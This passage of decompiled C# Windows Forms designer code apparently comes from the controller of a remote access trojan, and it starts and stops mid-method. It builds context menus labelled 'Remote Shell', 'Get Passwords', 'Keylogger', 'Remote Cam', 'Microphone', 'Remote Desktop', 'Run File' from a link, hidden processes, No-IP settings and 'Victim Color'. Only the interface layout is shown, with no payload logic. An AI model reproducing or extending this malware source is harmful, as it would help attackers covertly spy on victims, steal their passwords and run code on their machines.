			this.P1.ErrorImage = (Image)componentResourceManager.GetObject("P1.ErrorImage");
			this.P1.ImageLocation = "";
			this.P1.InitialImage = null;
			Control arg_2BB7_0 = this.P1;
			location = new Point(87, 79);
			arg_2BB7_0.Location = location;
			this.P1.Name = "P1";
			Control arg_2BE5_0 = this.P1;
			size = new Size(193, 88);
			arg_2BE5_0.Size = size;
			this.P1.SizeMode = PictureBoxSizeMode.StretchImage;
			this.P1.TabIndex = 1;
			this.P1.TabStop = false;
			this.Panel1.Controls.Add(this.Logs1);
			this.Panel1.Dock = DockStyle.Fill;
			Control arg_2C48_0 = this.Panel1;
			location = new Point(0, 0);
			arg_2C48_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_2C79_0 = this.Panel1;
			size = new Size(860, 334);
			arg_2C79_0.Size = size;
			this.Panel1.TabIndex = 11;
			this.Logs1.Anchor = AnchorStyles.Bottom;
			Control arg_2CB4_0 = this.Logs1;
			location = new Point(828, 315);
			arg_2CB4_0.Location = location;
			this.Logs1.Name = "Logs1";
			Control arg_2CDF_0 = this.Logs1;
			size = new Size(10, 16);
			arg_2CDF_0.Size = size;
			this.Logs1.TabIndex = 16;
			this.ImageList1.ColorDepth = ColorDepth.Depth32Bit;
			ImageList arg_2D15_0 = this.ImageList1;
			size = new Size(20, 20);
			arg_2D15_0.ImageSize = size;
			this.ImageList1.TransparentColor = Color.Transparent;
			this.Panel2.BackgroundImageLayout = ImageLayout.Stretch;
			this.Panel2.BorderStyle = BorderStyle.FixedSingle;
			this.Panel2.ContextMenuStrip = this.CM3;
			this.Panel2.Controls.Add(this.P1);
			Control arg_2D89_0 = this.Panel2;
			location = new Point(457, 364);
			arg_2D89_0.Location = location;
			this.Panel2.Name = "Panel2";
			Control arg_2DB4_0 = this.Panel2;
			size = new Size(10, 10);
			arg_2DB4_0.Size = size;
			this.Panel2.TabIndex = 12;
			this.ContextMenuStrip3.BackColor = Color.White;
			this.ContextMenuStrip3.Items.AddRange(new ToolStripItem[]
			{
				this.ManagerToolStripMenuItem,
				this.ToolStripMenuItem8,
				this.ToolStripMenuItem16,
				this.ToolStripMenuItem17,
				this.MicrophoneToolStripMenuItem,
				this.ToolStripMenuItem18,
				this.ToolStripMenuItem19,
				this.ToolStripMenuItem20,
				this.ToolStripMenuItem21,
				this.YYToolStripMenuItem,
				this.ComputadorToolStripMenuItem1,
				this.IndexFileToolStripMenuItem1
			});
			this.ContextMenuStrip3.Name = "ContextMenuStrip1";
			this.ContextMenuStrip3.RenderMode = ToolStripRenderMode.Professional;
			Control arg_2EB4_0 = this.ContextMenuStrip3;
			size = new Size(167, 268);
			arg_2EB4_0.Size = size;
			this.ManagerToolStripMenuItem.BackColor = Color.Black;
			this.ManagerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.HhhhhToolStripMenuItem,
				this.HhhhhhToolStripMenuItem,
				this.YyyyyyyyToolStripMenuItem,
				this.HhhhhhhhToolStripMenuItem,
				this.GgggggggToolStripMenuItem,
				this.ServicesToolStripMenuItem,
				this.MensagemChatToolStripMenuItem,
				this.OpenChatToolStripMenuItem1,
				this.LogsHackdToolStripMenuItem,
				this.UploadImageToolStripMenuItem,
				this.BackColorToolStripMenuItem,
				this.GridLinesToolStripMenuItem
			});
			this.ManagerToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ManagerToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.ManagerToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ManagerToolStripMenuItem.Image");
			this.ManagerToolStripMenuItem.Name = "ManagerToolStripMenuItem";
			ToolStripItem arg_2FE2_0 = this.ManagerToolStripMenuItem;
			size = new Size(166, 22);
			arg_2FE2_0.Size = size;
			this.ManagerToolStripMenuItem.Text = "Manager";
			this.HhhhhToolStripMenuItem.BackColor = Color.Black;
			this.HhhhhToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.HhhhhToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("HhhhhToolStripMenuItem.Image");
			this.HhhhhToolStripMenuItem.Name = "HhhhhToolStripMenuItem";
			ToolStripItem arg_3060_0 = this.HhhhhToolStripMenuItem;
			size = new Size(164, 22);
			arg_3060_0.Size = size;
			this.HhhhhToolStripMenuItem.Text = "File Manager";
			this.HhhhhhToolStripMenuItem.BackColor = Color.Black;
			this.HhhhhhToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.HhhhhhToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("HhhhhhToolStripMenuItem.Image");
			this.HhhhhhToolStripMenuItem.Name = "HhhhhhToolStripMenuItem";
			ToolStripItem arg_30DE_0 = this.HhhhhhToolStripMenuItem;
			size = new Size(164, 22);
			arg_30DE_0.Size = size;
			this.HhhhhhToolStripMenuItem.Text = "Back Image";
			this.YyyyyyyyToolStripMenuItem.BackColor = Color.Black;
			this.YyyyyyyyToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.YyyyyyyyToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("YyyyyyyyToolStripMenuItem.Image");
			this.YyyyyyyyToolStripMenuItem.Name = "YyyyyyyyToolStripMenuItem";
			ToolStripItem arg_315C_0 = this.YyyyyyyyToolStripMenuItem;
			size = new Size(164, 22);
			arg_315C_0.Size = size;
			this.YyyyyyyyToolStripMenuItem.Text = "Remote Shell";
			this.HhhhhhhhToolStripMenuItem.BackColor = Color.Black;
			this.HhhhhhhhToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.HhhhhhhhToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("HhhhhhhhToolStripMenuItem.Image");
			this.HhhhhhhhToolStripMenuItem.Name = "HhhhhhhhToolStripMenuItem";
			ToolStripItem arg_31DA_0 = this.HhhhhhhhToolStripMenuItem;
			size = new Size(164, 22);
			arg_31DA_0.Size = size;
			this.HhhhhhhhToolStripMenuItem.Text = "Regisirty";
			this.GgggggggToolStripMenuItem.BackColor = Color.Black;
			this.GgggggggToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.GgggggggToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("GgggggggToolStripMenuItem.Image");
			this.GgggggggToolStripMenuItem.Name = "GgggggggToolStripMenuItem";
			ToolStripItem arg_3258_0 = this.GgggggggToolStripMenuItem;
			size = new Size(164, 22);
			arg_3258_0.Size = size;
			this.GgggggggToolStripMenuItem.Text = "WebSite";
			this.ServicesToolStripMenuItem.BackColor = Color.Black;
			this.ServicesToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.ServicesToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ServicesToolStripMenuItem.Image");
			this.ServicesToolStripMenuItem.Name = "ServicesToolStripMenuItem";
			ToolStripItem arg_32D6_0 = this.ServicesToolStripMenuItem;
			size = new Size(164, 22);
			arg_32D6_0.Size = size;
			this.ServicesToolStripMenuItem.Text = "Hied Process ";
			this.MensagemChatToolStripMenuItem.BackColor = Color.Black;
			this.MensagemChatToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem1,
				this.ToolStripMenuItem3,
				this.ExlamationMessageToolStripMenuItem1
			});
			this.MensagemChatToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.MensagemChatToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("MensagemChatToolStripMenuItem.Image");
			this.MensagemChatToolStripMenuItem.Name = "MensagemChatToolStripMenuItem";
			ToolStripItem arg_3390_0 = this.MensagemChatToolStripMenuItem;
			size = new Size(164, 22);
			arg_3390_0.Size = size;
			this.MensagemChatToolStripMenuItem.Text = "Mensagem Chat";
			this.ToolStripMenuItem1.BackColor = Color.Black;
			this.ToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem1.Image");
			this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
			ToolStripItem arg_340E_0 = this.ToolStripMenuItem1;
			size = new Size(193, 22);
			arg_340E_0.Size = size;
			this.ToolStripMenuItem1.Text = "Error Message";
			this.ToolStripMenuItem3.BackColor = Color.Black;
			this.ToolStripMenuItem3.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem3.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem3.Image");
			this.ToolStripMenuItem3.Name = "ToolStripMenuItem3";
			ToolStripItem arg_348C_0 = this.ToolStripMenuItem3;
			size = new Size(193, 22);
			arg_348C_0.Size = size;
			this.ToolStripMenuItem3.Text = "Information message";
			this.ExlamationMessageToolStripMenuItem1.BackColor = Color.Black;
			this.ExlamationMessageToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.ExlamationMessageToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ExlamationMessageToolStripMenuItem1.Image");
			this.ExlamationMessageToolStripMenuItem1.Name = "ExlamationMessageToolStripMenuItem1";
			ToolStripItem arg_350A_0 = this.ExlamationMessageToolStripMenuItem1;
			size = new Size(193, 22);
			arg_350A_0.Size = size;
			this.ExlamationMessageToolStripMenuItem1.Text = "Exlamation Message";
			this.OpenChatToolStripMenuItem1.BackColor = Color.Black;
			this.OpenChatToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.NoIPSiteToolStripMenuItem,
				this.NoIPToolStripMenuItem,
				this.SiteEmailToolStripMenuItem,
				this.PortSiteToolStripMenuItem
			});
			this.OpenChatToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.OpenChatToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("OpenChatToolStripMenuItem1.Image");
			this.OpenChatToolStripMenuItem1.Name = "OpenChatToolStripMenuItem1";
			ToolStripItem arg_35CF_0 = this.OpenChatToolStripMenuItem1;
			size = new Size(164, 22);
			arg_35CF_0.Size = size;
			this.OpenChatToolStripMenuItem1.Text = "No IP Site";
			this.NoIPSiteToolStripMenuItem.BackColor = Color.Black;
			this.NoIPSiteToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.NoIPSiteToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("NoIPSiteToolStripMenuItem.Image");
			this.NoIPSiteToolStripMenuItem.Name = "NoIPSiteToolStripMenuItem";
			ToolStripItem arg_364D_0 = this.NoIPSiteToolStripMenuItem;
			size = new Size(161, 22);
			arg_364D_0.Size = size;
			this.NoIPSiteToolStripMenuItem.Text = "No IP Site";
			this.NoIPToolStripMenuItem.BackColor = Color.Black;
			this.NoIPToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.NoIPToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("NoIPToolStripMenuItem.Image");
			this.NoIPToolStripMenuItem.Name = "NoIPToolStripMenuItem";
			ToolStripItem arg_36CB_0 = this.NoIPToolStripMenuItem;
			size = new Size(161, 22);
			arg_36CB_0.Size = size;
			this.NoIPToolStripMenuItem.Text = "No IP Download ";
			this.SiteEmailToolStripMenuItem.BackColor = Color.Black;
			this.SiteEmailToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.SiteEmailToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("SiteEmailToolStripMenuItem.Image");
			this.SiteEmailToolStripMenuItem.Name = "SiteEmailToolStripMenuItem";
			ToolStripItem arg_3749_0 = this.SiteEmailToolStripMenuItem;
			size = new Size(161, 22);
			arg_3749_0.Size = size;
			this.SiteEmailToolStripMenuItem.Text = "Site Email";
			this.PortSiteToolStripMenuItem.BackColor = Color.Black;
			this.PortSiteToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.PortSiteToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("PortSiteToolStripMenuItem.Image");
			this.PortSiteToolStripMenuItem.Name = "PortSiteToolStripMenuItem";
			ToolStripItem arg_37C7_0 = this.PortSiteToolStripMenuItem;
			size = new Size(161, 22);
			arg_37C7_0.Size = size;
			this.PortSiteToolStripMenuItem.Text = "Port Site";
			this.LogsHackdToolStripMenuItem.BackColor = Color.Black;
			this.LogsHackdToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.LogsHackdToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("LogsHackdToolStripMenuItem.Image");
			this.LogsHackdToolStripMenuItem.Name = "LogsHackdToolStripMenuItem";
			ToolStripItem arg_3845_0 = this.LogsHackdToolStripMenuItem;
			size = new Size(164, 22);
			arg_3845_0.Size = size;
			this.LogsHackdToolStripMenuItem.Text = "Open Chat ";
			this.UploadImageToolStripMenuItem.BackColor = Color.Black;
			this.UploadImageToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.UploadImageToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("UploadImageToolStripMenuItem.Image");
			this.UploadImageToolStripMenuItem.Name = "UploadImageToolStripMenuItem";
			ToolStripItem arg_38C3_0 = this.UploadImageToolStripMenuItem;
			size = new Size(164, 22);
			arg_38C3_0.Size = size;
			this.UploadImageToolStripMenuItem.Text = "Upload image";
			this.BackColorToolStripMenuItem.BackColor = Color.Black;
			this.BackColorToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.RRRToolStripMenuItem,
				this.RRRRToolStripMenuItem
			});
			this.BackColorToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.BackColorToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("BackColorToolStripMenuItem.Image");
			this.BackColorToolStripMenuItem.Name = "BackColorToolStripMenuItem";
			ToolStripItem arg_3972_0 = this.BackColorToolStripMenuItem;
			size = new Size(164, 22);
			arg_3972_0.Size = size;
			this.BackColorToolStripMenuItem.Text = "Grid Lines";
			this.RRRToolStripMenuItem.BackColor = Color.Black;
			this.RRRToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.RRRToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RRRToolStripMenuItem.Image");
			this.RRRToolStripMenuItem.Name = "RRRToolStripMenuItem";
			ToolStripItem arg_39F0_0 = this.RRRToolStripMenuItem;
			size = new Size(152, 22);
			arg_39F0_0.Size = size;
			this.RRRToolStripMenuItem.Text = "ListView";
			this.RRRRToolStripMenuItem.BackColor = Color.Black;
			this.RRRRToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.RRRRToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RRRRToolStripMenuItem.Image");
			this.RRRRToolStripMenuItem.Name = "RRRRToolStripMenuItem";
			ToolStripItem arg_3A6E_0 = this.RRRRToolStripMenuItem;
			size = new Size(152, 22);
			arg_3A6E_0.Size = size;
			this.RRRRToolStripMenuItem.Text = "Details";
			this.GridLinesToolStripMenuItem.BackColor = Color.Black;
			this.GridLinesToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.ColorLIToolStripMenuItem,
				this.ColorLinesToolStripMenuItem,
				this.GridLinesToolStripToolStripMenuItem
			});
			this.GridLinesToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.GridLinesToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("GridLinesToolStripMenuItem.Image");
			this.GridLinesToolStripMenuItem.Name = "GridLinesToolStripMenuItem";
			ToolStripItem arg_3B28_0 = this.GridLinesToolStripMenuItem;
			size = new Size(164, 22);
			arg_3B28_0.Size = size;
			this.GridLinesToolStripMenuItem.Text = "Color Lines";
			this.ColorLIToolStripMenuItem.BackColor = Color.Black;
			this.ColorLIToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.ColorLIToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ColorLIToolStripMenuItem.Image");
			this.ColorLIToolStripMenuItem.Name = "ColorLIToolStripMenuItem";
			ToolStripItem arg_3BA6_0 = this.ColorLIToolStripMenuItem;
			size = new Size(152, 22);
			arg_3BA6_0.Size = size;
			this.ColorLIToolStripMenuItem.Text = "Victim Color";
			this.ColorLinesToolStripMenuItem.BackColor = Color.Black;
			this.ColorLinesToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.ColorLinesToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ColorLinesToolStripMenuItem.Image");
			this.ColorLinesToolStripMenuItem.Name = "ColorLinesToolStripMenuItem";
			ToolStripItem arg_3C24_0 = this.ColorLinesToolStripMenuItem;
			size = new Size(152, 22);
			arg_3C24_0.Size = size;
			this.ColorLinesToolStripMenuItem.Text = "Color Lines";
			this.GridLinesToolStripToolStripMenuItem.BackColor = Color.Black;
			this.GridLinesToolStripToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.GridLinesToolStripToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("GridLinesToolStripToolStripMenuItem.Image");
			this.GridLinesToolStripToolStripMenuItem.Name = "GridLinesToolStripToolStripMenuItem";
			ToolStripItem arg_3CA2_0 = this.GridLinesToolStripToolStripMenuItem;
			size = new Size(152, 22);
			arg_3CA2_0.Size = size;
			this.GridLinesToolStripToolStripMenuItem.Text = "Color Strip";
			this.ToolStripMenuItem8.BackColor = Color.Black;
			this.ToolStripMenuItem8.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem13,
				this.ToolStripMenuItem14,
				this.ToolStripMenuItem15
			});
			this.ToolStripMenuItem8.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripMenuItem8.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem8.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem8.Image");
			this.ToolStripMenuItem8.Name = "ToolStripMenuItem8";
			ToolStripItem arg_3D7A_0 = this.ToolStripMenuItem8;
			size = new Size(166, 22);
			arg_3D7A_0.Size = size;
			this.ToolStripMenuItem8.Text = "Run File";
			this.ToolStripMenuItem13.BackColor = Color.Black;
			this.ToolStripMenuItem13.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem13.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem13.Image");
			this.ToolStripMenuItem13.Name = "ToolStripMenuItem13";
			ToolStripItem arg_3DF8_0 = this.ToolStripMenuItem13;
			size = new Size(130, 22);
			arg_3DF8_0.Size = size;
			this.ToolStripMenuItem13.Text = "From Link";
			this.ToolStripMenuItem14.BackColor = SystemColors.ActiveCaptionText;
			this.ToolStripMenuItem14.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem14.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem14.Image");
			this.ToolStripMenuItem14.Name = "ToolStripMenuItem14";
			ToolStripItem arg_3E76_0 = this.ToolStripMenuItem14;
			size = new Size(130, 22);
			arg_3E76_0.Size = size;
			this.ToolStripMenuItem14.Text = "From Disk";
			this.ToolStripMenuItem15.BackColor = SystemColors.ActiveCaptionText;
			this.ToolStripMenuItem15.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem15.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem15.Image");
			this.ToolStripMenuItem15.Name = "ToolStripMenuItem15";
			ToolStripItem arg_3EF4_0 = this.ToolStripMenuItem15;
			size = new Size(130, 22);
			arg_3EF4_0.Size = size;
			this.ToolStripMenuItem15.Text = "Script";
			this.ToolStripMenuItem16.BackColor = Color.Black;
			this.ToolStripMenuItem16.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.RemoteDesktopToolStripMenuItem1
			});
			this.ToolStripMenuItem16.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripMenuItem16.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem16.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem16.Image");
			this.ToolStripMenuItem16.Name = "ToolStripMenuItem16";
			ToolStripItem arg_3FB6_0 = this.ToolStripMenuItem16;
			size = new Size(166, 22);
			arg_3FB6_0.Size = size;
			this.ToolStripMenuItem16.Text = "Remote Desktop";
			this.RemoteDesktopToolStripMenuItem1.BackColor = Color.Black;
			this.RemoteDesktopToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.RemoteDesktopToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("RemoteDesktopToolStripMenuItem1.Image");
			this.RemoteDesktopToolStripMenuItem1.Name = "RemoteDesktopToolStripMenuItem1";
			ToolStripItem arg_4034_0 = this.RemoteDesktopToolStripMenuItem1;
			size = new Size(166, 22);
			arg_4034_0.Size = size;
			this.RemoteDesktopToolStripMenuItem1.Text = "Remote Desktop";
			this.ToolStripMenuItem17.BackColor = Color.Black;
			this.ToolStripMenuItem17.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripMenuItem17.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem17.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem17.Image");
			this.ToolStripMenuItem17.Name = "ToolStripMenuItem17";
			ToolStripItem arg_40D0_0 = this.ToolStripMenuItem17;
			size = new Size(166, 22);
			arg_40D0_0.Size = size;
			this.ToolStripMenuItem17.Text = "Remote Cam";
			this.MicrophoneToolStripMenuItem.BackColor = Color.Black;
			this.MicrophoneToolStripMenuItem.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.MicrophoneToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.MicrophoneToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("MicrophoneToolStripMenuItem.Image");
			this.MicrophoneToolStripMenuItem.Name = "MicrophoneToolStripMenuItem";
			ToolStripItem arg_416C_0 = this.MicrophoneToolStripMenuItem;
			size = new Size(166, 22);
			arg_416C_0.Size = size;
			this.MicrophoneToolStripMenuItem.Text = "Microphone";
			this.ToolStripMenuItem18.BackColor = Color.Black;
			this.ToolStripMenuItem18.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripMenuItem18.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem18.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem18.Image");
			this.ToolStripMenuItem18.Name = "ToolStripMenuItem18";
			ToolStripItem arg_4208_0 = this.ToolStripMenuItem18;
			size = new Size(166, 22);
			arg_4208_0.Size = size;
			this.ToolStripMenuItem18.Text = "Get Passwords";
			this.ToolStripMenuItem19.BackColor = Color.Black;
			this.ToolStripMenuItem19.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripMenuItem19.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem19.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem19.Image");
			this.ToolStripMenuItem19.Name = "ToolStripMenuItem19";
			ToolStripItem arg_42A4_0 = this.ToolStripMenuItem19;
			size = new Size(166, 22);
			arg_42A4_0.Size = size;
			this.ToolStripMenuItem19.Text = "Keylogger";
			this.ToolStripMenuItem20.BackColor = Color.Black;
			this.ToolStripMenuItem20.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripMenuItem20.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem20.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem20.Image");
			this.ToolStripMenuItem20.Name = "ToolStripMenuItem20";
			ToolStripItem arg_4340_0 = this.ToolStripMenuItem20;
			size = new Size(166, 22);
			arg_4340_0.Size = size;
			this.ToolStripMenuItem20.Text = "Open Chat";
			this.ToolStripMenuItem21.BackColor = Color.Black;
			this.ToolStripMenuItem21.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem22,
				this.ToolStripMenuItem25,
				this.ToolStripMenuItem26,
				this.ToolStripMenuItem27,
				this.ToolStripMenuItem28,
				this.ToolStripMenuItem29
			});
			this.ToolStripMenuItem21.Font = new Font("Arial", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ToolStripMenuItem21.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem21.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem21.Image");
			this.ToolStripMenuItem21.Name = "ToolStripMenuItem21";
			ToolStripItem arg_4439_0 = this.ToolStripMenuItem21;
			size = new Size(166, 22);
			arg_4439_0.Size = size;
			this.ToolStripMenuItem21.Text = "Server";
			this.ToolStripMenuItem22.BackColor = Color.Black;
			this.ToolStripMenuItem22.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem23,
				this.ToolStripMenuItem24
			});
			this.ToolStripMenuItem22.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem22.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem22.Image");
			this.ToolStripMenuItem22.Name = "ToolStripMenuItem22";
			ToolStripItem arg_44E8_0 = this.ToolStripMenuItem22;
			size = new Size(135, 22);
			arg_44E8_0.Size = size;
			this.ToolStripMenuItem22.Text = "Update";
			this.ToolStripMenuItem23.BackColor = Color.Black;
			this.ToolStripMenuItem23.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem23.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem23.Image");
			this.ToolStripMenuItem23.Name = "ToolStripMenuItem23";
			ToolStripItem arg_4566_0 = this.ToolStripMenuItem23;
			size = new Size(130, 22);
			arg_4566_0.Size = size;
			this.ToolStripMenuItem23.Text = "From DISK";
			this.ToolStripMenuItem24.BackColor = Color.Black;
			this.ToolStripMenuItem24.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem24.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem24.Image");
			this.ToolStripMenuItem24.Name = "ToolStripMenuItem24";
			ToolStripItem arg_45E4_0 = this.ToolStripMenuItem24;
			size = new Size(130, 22);
			arg_45E4_0.Size = size;
			this.ToolStripMenuItem24.Text = "From LINK";
			this.ToolStripMenuItem25.BackColor = Color.Black;
			this.ToolStripMenuItem25.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem25.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem25.Image");
			this.ToolStripMenuItem25.Name = "ToolStripMenuItem25";
			ToolStripItem arg_4662_0 = this.ToolStripMenuItem25;
			size = new Size(135, 22);
			arg_4662_0.Size = size;
			this.ToolStripMenuItem25.Text = "Uninstall";
			this.ToolStripMenuItem26.BackColor = Color.Black;
			this.ToolStripMenuItem26.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem26.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem26.Image");
			this.ToolStripMenuItem26.Name = "ToolStripMenuItem26";
			ToolStripItem arg_46E0_0 = this.ToolStripMenuItem26;
			size = new Size(135, 22);
			arg_46E0_0.Size = size;
			this.ToolStripMenuItem26.Text = "Restart";
			this.ToolStripMenuItem27.BackColor = Color.Black;
			this.ToolStripMenuItem27.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem27.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem27.Image");
			this.ToolStripMenuItem27.Name = "ToolStripMenuItem27";
			ToolStripItem arg_475E_0 = this.ToolStripMenuItem27;
			size = new Size(135, 22);
			arg_475E_0.Size = size;
			this.ToolStripMenuItem27.Text = "Close";
			this.ToolStripMenuItem28.BackColor = Color.Black;
			this.ToolStripMenuItem28.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem28.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem28.Image");
			this.ToolStripMenuItem28.Name = "ToolStripMenuItem28";
			ToolStripItem arg_47DC_0 = this.ToolStripMenuItem28;
			size = new Size(135, 22);
			arg_47DC_0.Size = size;
			this.ToolStripMenuItem28.Text = "Disconnect";
			this.ToolStripMenuItem29.BackColor = Color.Black;
			this.ToolStripMenuItem29.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem29.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem29.Image");
			this.ToolStripMenuItem29.Name = "ToolStripMenuItem29";
			ToolStripItem arg_485A_0 = this.ToolStripMenuItem29;
			size = new Size(135, 22);
			arg_485A_0.Size = size;
			this.ToolStripMenuItem29.Text = "Rename";
			this.YYToolStripMenuItem.BackColor = Color.Black;
			this.YYToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.YYToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("YYToolStripMenuItem.Image");
			this.YYToolStripMenuItem.Name = "YYToolStripMenuItem";
			ToolStripItem arg_48D8_0 = this.YYToolStripMenuItem;
			size = new Size(166, 22);
			arg_48D8_0.Size = size;
			this.YYToolStripMenuItem.Text = "Open File";
			this.ComputadorToolStripMenuItem1.BackColor = Color.Black;
			this.ComputadorToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.RefreshToolStripMenuItem1,
				this.ToolStripMenuItem30,
				this.CDPlayerToolStripMenuItem1
			});
			this.ComputadorToolStripMenuItem1.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ComputadorToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.ComputadorToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ComputadorToolStripMenuItem1.Image");
			this.ComputadorToolStripMenuItem1.Name = "ComputadorToolStripMenuItem1";
			ToolStripItem arg_49B0_0 = this.ComputadorToolStripMenuItem1;
			size = new Size(166, 22);
			arg_49B0_0.Size = size;
			this.ComputadorToolStripMenuItem1.Text = "Computador";
			this.RefreshToolStripMenuItem1.BackColor = Color.Black;
			this.RefreshToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.RefreshToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("RefreshToolStripMenuItem1.Image");
			this.RefreshToolStripMenuItem1.Name = "RefreshToolStripMenuItem1";
			ToolStripItem arg_4A2E_0 = this.RefreshToolStripMenuItem1;
			size = new Size(136, 22);
